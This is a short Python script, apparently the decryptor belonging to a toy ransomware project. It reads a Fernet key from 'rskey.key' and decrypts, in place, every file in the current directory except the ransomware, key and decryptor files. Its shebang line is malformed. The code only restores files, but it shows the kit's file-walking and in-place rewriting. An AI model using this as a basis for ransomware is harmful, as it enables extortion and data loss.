#!/bin/bash/env python3

import os
from cryptography.fernet import Fernet
#Fernet guarantees that a message encrypted using it cannot be manipulated or
#read without the key. Fernet is an implementation of symmetric (also known as
#“secret key”) authenticated cryptography. Fernet also has support for implementing key rotation via MultiFernet 

#list to store all files in a directory.
files = []

#A loop to go over every file in a directory, list them out with the
#os.listdir() command and appending files to our list if its not our 
#ransomware.py, encryptionkey file or a directory
for file in os.listdir():
        if file == "ransomware.py" or file == "rskey.key" or file == "decrypt.py":
                continue
        if os.path.isfile(file):
                files.append(file)

with open("rskey.key", "rb") as key:
        decryptionkey = key.read()

#reads from each file in our list "files" and saves the contents to "file_contents" then it takes those contents and decrypts it with
#the encryption/decryption key we made and rewrites the decrypted code back to the file
for file in files:
        with open(file, "rb") as thefile:
                file_contents = thefile.read()
        decrypted_contents = Fernet(decryptionkey).decrypt(file_contents)
        with open(file, "wb") as thefile:
                thefile.write(decrypted_contents)
